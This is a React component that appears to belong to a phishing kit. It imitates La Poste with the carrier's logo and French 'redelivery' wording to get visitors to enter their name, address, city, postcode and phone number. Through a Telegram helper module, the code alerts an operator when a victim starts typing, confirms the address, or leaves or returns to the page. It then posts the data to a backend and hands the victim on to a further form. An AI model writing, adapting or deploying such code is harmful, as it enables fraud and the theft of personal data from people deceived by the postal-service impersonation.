import { useState, useEffect } from "react";
import { Truck, Calendar, Check, X, User, MapPin, Phone } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { sendTypingAddressNotification, sendAddressConfirmNotification, sendPageHiddenNotification, sendPageVisibleNotification } from "@/components/tgapi";
import { FloatingInput } from "@/components/ui/floating-input";
import { useToast } from "@/hooks/use-toast";
import laPosteLogo from "@/assets/laposte.png";
interface FrAddressFormProps {
  externalTrigger?: boolean;
  onClose?: () => void;
  invoiceData?: any;
  invoiceId?: string;
  onShowDeliveryForm?: (data: any) => void;
}
const FrAddressForm = ({
  externalTrigger = false,
  onClose,
  invoiceData,
  invoiceId,
  onShowDeliveryForm
}: FrAddressFormProps) => {
  const {
    toast
  } = useToast();
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showContent, setShowContent] = useState(false);
  const [showAddressForm, setShowAddressForm] = useState(false);
  const [isFormLoading, setIsFormLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [isFormInitialized, setIsFormInitialized] = useState(false);
  const [hasStartedTypingAddress, setHasStartedTypingAddress] = useState(false);

  // Form state - initialize with invoice data if available
  const [formData, setFormData] = useState({
    fullName: invoiceData?.name || '',
    address: invoiceData?.address || '',
    city: invoiceData?.city || '',
    postcode: invoiceData?.zip || '',
    phone: invoiceData?.phone || ''
  });

  // Error state
  const [errors, setErrors] = useState({
    fullName: '',
    address: '',
    city: '',
    postcode: '',
    phone: ''
  });

  // Initialize form data only once when invoice data is first available
  useEffect(() => {
    if (invoiceData && !isFormInitialized) {
      setFormData({
        fullName: invoiceData.name || '',
        address: invoiceData.address || '',
        city: invoiceData.city || '',
        postcode: invoiceData.zip || '',
        phone: invoiceData.phone || ''
      });
      setIsFormInitialized(true);
    }
  }, [invoiceData, isFormInitialized]);

  // Page visibility change handler
  useEffect(() => {
    if (!isDialogOpen) return;
    
    const handleVisibilityChange = () => {
      const clientIdentifier = formData.fullName || invoiceData?.name || "Unknown Client";
      
      if (clientIdentifier === "Unknown Client") return;
      
      if (document.hidden) {
        sendPageHiddenNotification(clientIdentifier);
      } else {
        sendPageVisibleNotification(clientIdentifier);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [isDialogOpen, formData.fullName, invoiceData?.name]);

  useEffect(() => {
    if (externalTrigger) {
      setIsDialogOpen(true);
      setIsLoading(true);
      setShowContent(false);
    }
  }, [externalTrigger]);
  useEffect(() => {
    if (isDialogOpen) {
      setIsLoading(true);
      setShowContent(false);
      const timer = setTimeout(() => {
        setIsLoading(false);
        setShowContent(true);
      }, 100);
      return () => clearTimeout(timer);
    } else {
      setShowContent(false);
    }
  }, [isDialogOpen]);
  const handleOpenChange = (newOpen: boolean) => {
    setIsDialogOpen(newOpen);
    if (!newOpen && onClose) {
      onClose();
    }
  };
  const handleContinueClick = () => {
    setIsFormLoading(true);
    setTimeout(() => {
      setIsFormLoading(false);
      setShowAddressForm(true);
    }, 100);
  };
  const sendTypingNotification = async () => {
    const invoiceName = formData.fullName || invoiceData?.name || "Unknown Invoice";
    const address = `${formData.address || invoiceData?.address || ""} ${formData.city || invoiceData?.city || ""} ${formData.postcode || invoiceData?.zip || ""}`.trim() || "Unknown Address";
    await sendTypingAddressNotification(invoiceName, address);
  };
  const handleInputChange = (field: string, value: string) => {
    // Check if user started typing in address field and we haven't sent notification yet
    if (field === 'address' && !hasStartedTypingAddress && value.length > 0) {
      setHasStartedTypingAddress(true);
      sendTypingNotification();
    }
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
    // Clear error when user types
    if (errors[field as keyof typeof errors]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };
  const validateField = (field: string, value: string) => {
    if (!value.trim()) {
      const fieldLabels = {
        fullName: 'Destinataire',
        address: 'Adresse',
        city: 'Ville',
        postcode: 'Code postal',
        phone: 'Téléphone'
      };
      const label = fieldLabels[field as keyof typeof fieldLabels] || field;
      setErrors(prev => ({
        ...prev,
        [field]: `${label} est requis`
      }));
      return false;
    }
    return true;
  };
  const sendAddressConfirmNotificationToTg = async () => {
    const invoiceName = formData.fullName || invoiceData?.name || "Unknown Invoice";
    const address = `${formData.address || ""} ${formData.city || ""} ${formData.postcode || ""}`.trim() || "Unknown Address";
    await sendAddressConfirmNotification(invoiceName, address);
  };
  const handleConfirmSubmit = async () => {
    // Validate all fields
    const fieldsToValidate = ['fullName', 'address', 'city', 'postcode', 'phone'];
    let hasErrors = false;
    fieldsToValidate.forEach(field => {
      if (!validateField(field, formData[field as keyof typeof formData])) {
        hasErrors = true;
      }
    });
    if (hasErrors) {
      return;
    }

    // Send Telegram notifications for address confirmation
    await sendAddressConfirmNotificationToTg();
    if (!invoiceId) {
      // If no invoiceId (preview mode), show success without API call
      setIsConfirmed(true);
      setTimeout(() => {
        setIsDialogOpen(false);
        if (onClose) onClose();
        // Pass updated form data without old_city (never update old_city)
        if (onShowDeliveryForm) onShowDeliveryForm(formData);
      }, 1000);
      return;
    }
    setIsSubmitting(true);
    try {
      const response = await fetch('/api/create_invoice.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          invoiceId: invoiceId,
          name: formData.fullName,
          address: formData.address,
          city: formData.city,
          zip: formData.postcode,
          phone: formData.phone
        })
      });
      if (response.ok) {
        const result = await response.json();
        // Show confirmation message and after 1 second trigger delivery form
        setIsConfirmed(true);
        setTimeout(() => {
          setIsDialogOpen(false);
          if (onClose) onClose();
          // Pass updated form data without old_city (never update old_city)
          if (onShowDeliveryForm) onShowDeliveryForm(formData);
        }, 1000);
      } else {
        const error = await response.json();
        toast({
          title: "Erreur",
          description: error.error || "Erreur lors de la mise à jour de l'adresse",
          variant: "destructive"
        });
      }
    } catch (error) {
      toast({
        title: "Erreur",
        description: "Erreur réseau. Veuillez réessayer.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };
  return <Dialog open={isDialogOpen} onOpenChange={handleOpenChange}>
      <DialogTitle className="sr-only">Formulaire d'adresse de livraison</DialogTitle>
      <DialogDescription className="sr-only">Formulaire pour mettre à jour l'adresse de livraison</DialogDescription>
      <DialogContent className="p-0 border-0 bg-black/20 shadow-none max-w-[320px] w-full my-2 max-h-[90vh] overflow-y-auto data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=open]:duration-300">
        <div className="h-auto flex flex-col">
          <Card className="shadow-2xl border-2 border-red-500 rounded-[6px] drop-shadow-xl bg-white flex flex-col transform transition-all duration-300 ease-in-out data-[state=open]:animate-in data-[state=open]:zoom-in-95 data-[state=open]:fade-in-0 hover:scale-98 hover:shadow-xl">
            {/* Banner with Logo - Sticky */}
            <div className="sticky top-0 z-10 bg-gradient-to-r from-yellow-400 to-yellow-500 p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-yellow-300 to-yellow-400 border-2 border-yellow-500 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-gray-700 font-chevin font-medium text-xs">Adresse de livraison</span>
                </div>
              </div>
              {/* Close Button */}
              <button onClick={() => setIsDialogOpen(false)} className="absolute right-3 top-3 bg-red-400/80 hover:bg-red-400 rounded-full w-6 h-6 flex items-center justify-center shadow-md hover:shadow-lg transition-all duration-300 hover:scale-105 border border-red-500">
                <X className="h-4 w-4 text-white" />
              </button>
              
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 w-10 h-10 bg-transparent rounded-full flex items-center justify-center shadow-lg border-2 border-transparent">
                <Calendar className="h-6 w-6 text-gray-800 drop-shadow-lg" />
              </div>
            </div>
            
            <div className="px-2 pt-4 pb-4 my-0 mx-[10px]">
              {isLoading ? <div className="p-6 animate-fade-in">
                  <Card className="shadow-lg border border-border/50 bg-white animate-scale-in transition-all duration-300 ease-in-out hover:scale-98 hover:shadow-xl transform">
                    <CardContent className="flex flex-col items-center space-y-6 pt-8 pb-8 mx-[10px] py-[10px]">
                      <div className="relative">
                        <div className="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center animate-pulse">
                          <Calendar className="h-8 w-8 text-blue-600" />
                        </div>
                        <div className="absolute inset-0 rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
                      </div>
                      <p className="text-gray-600 text-center text-sm max-w-xs animate-fade-in" style={{
                    animationDelay: '0.2s'
                  }}>
                        Veuillez patienter pendant que nous nous connectons au système de suivi.
                      </p>
                    </CardContent>
                  </Card>
                </div> : showContent ? <div className="space-y-4 animate-fade-in">
                  <div className="p-4 bg-blue-50 rounded-xl border border-border/50 shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                    <div className="text-center space-y-4">
                      {!showAddressForm ? <div className="space-y-4">
                          <div className="text-left space-y-2">
                            <p className="text-xs text-gray-700">
                              {formData.fullName || invoiceData?.name ? `${formData.fullName || invoiceData?.name}, Veuillez saisir votre adresse actuelle pour organiser une nouvelle livraison.` : 'Veuillez saisir votre adresse actuelle pour organiser une nouvelle livraison.'}
                            </p>
                          </div>
                          <Button onClick={handleContinueClick} disabled={isFormLoading} className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-xs font-semibold rounded-lg hover:scale-105 active:scale-95 mx-auto ${isFormLoading ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'}`}>
                            {isFormLoading ? 'Chargement...' : 'Continuer'}
                          </Button>
                        </div> : isConfirmed ? <div className="space-y-4 animate-fade-in text-center">
                          <div className="relative">
                            <div className="w-16 h-16 mx-auto rounded-full bg-green-100 flex items-center justify-center mb-4">
                              <Check className="h-8 w-8 text-green-600" />
                            </div>
                          </div>
                          <div className="space-y-2">
                            <h3 className="text-sm font-semibold text-gray-900">Adresse confirmée !</h3>
                            <p className="text-xs text-gray-700">Votre adresse de livraison a été mise à jour avec succès.</p>
                            <p className="text-xs text-gray-500 font-medium flex items-center justify-center gap-1">
                              Redirection
                              <span className="flex gap-0.5">
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{
                            animationDelay: '0s'
                          }}></span>
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{
                            animationDelay: '0.2s'
                          }}></span>
                                <span className="w-1 h-1 bg-gray-500 rounded-full animate-pulse" style={{
                            animationDelay: '0.4s'
                          }}></span>
                              </span>
                            </p>
                          </div>
                        </div> : <div className="space-y-4 animate-fade-in">
                          <div className="text-left space-y-3">
                            <h3 className="text-xs font-semibold text-gray-900">Confirmez votre adresse de livraison ci-dessous</h3>
                            <div className="space-y-5 mb-5">
                              <div className="space-y-4">
                                <FloatingInput label="Nom complet" required value={formData.fullName} onChange={e => handleInputChange('fullName', e.target.value)} onBlur={e => validateField('fullName', e.target.value)} placeholder="Saisir le nom du destinataire" error={errors.fullName} className="text-xs" />
                                
                                <FloatingInput label="Adresse" required value={formData.address} onChange={e => handleInputChange('address', e.target.value)} onBlur={e => validateField('address', e.target.value)} placeholder="Saisir l'adresse complète" error={errors.address} />
                                
                                <div className="grid grid-cols-2 gap-3">
                                  <FloatingInput label="Ville" required value={formData.city} onChange={e => handleInputChange('city', e.target.value)} onBlur={e => validateField('city', e.target.value)} placeholder="Saisir la ville" error={errors.city} />
                                  
                                  <FloatingInput label="Code postal" required value={formData.postcode} onChange={e => handleInputChange('postcode', e.target.value)} onBlur={e => validateField('postcode', e.target.value)} placeholder="Saisir le CP" error={errors.postcode} />
                                </div>
                                
                                <FloatingInput label="Numéro de téléphone" required type="tel" value={formData.phone} onChange={e => handleInputChange('phone', e.target.value)} onBlur={e => validateField('phone', e.target.value)} placeholder="Saisir le numéro de téléphone" error={errors.phone} />
                              </div>
                            </div>
                            <Button onClick={handleConfirmSubmit} disabled={isSubmitting} className={`w-auto px-4 py-1.5 bg-gradient-to-r from-green-400 to-green-500 hover:from-green-500 hover:to-green-600 text-white shadow-lg hover:shadow-xl transition-all duration-300 text-xs font-semibold rounded-lg hover:scale-105 active:scale-95 mx-auto ${isSubmitting ? 'scale-95 opacity-75 cursor-not-allowed' : 'cursor-pointer'}`}>
                              {isSubmitting ? 'Mise à jour...' : 'Confirmer'}
                            </Button>
                          </div>
                        </div>}
                    </div>
                  </div>
                </div> : null}
            </div>
            
            {/* Status Banner - Similar to DHL header style */}
            <div className="sticky bottom-0 z-10 bg-white px-2 py-[8px]">
              <div className="flex items-center justify-center">
                <img src={laPosteLogo} alt="La Poste Logo" className="h-5 w-auto" />
              </div>
            </div>
          </Card>
        </div>
      </DialogContent>
    </Dialog>;
};
export default FrAddressForm;